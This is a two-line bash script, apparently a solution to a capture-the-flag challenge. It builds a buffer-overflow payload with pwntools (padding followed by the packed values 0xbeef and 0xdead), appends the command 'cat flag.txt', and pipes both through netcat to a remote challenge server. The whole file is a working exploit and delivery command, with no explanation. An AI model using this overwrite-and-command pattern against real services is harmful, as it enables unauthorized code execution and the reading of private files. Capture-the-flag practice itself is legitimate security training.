#!/bin/bash

(python2 -c 'from pwn import *; print("a"*8+p32(0xbeef)+p32(0xdead))'; echo 'cat flag.txt') | nc csie.ctf.tw 10125
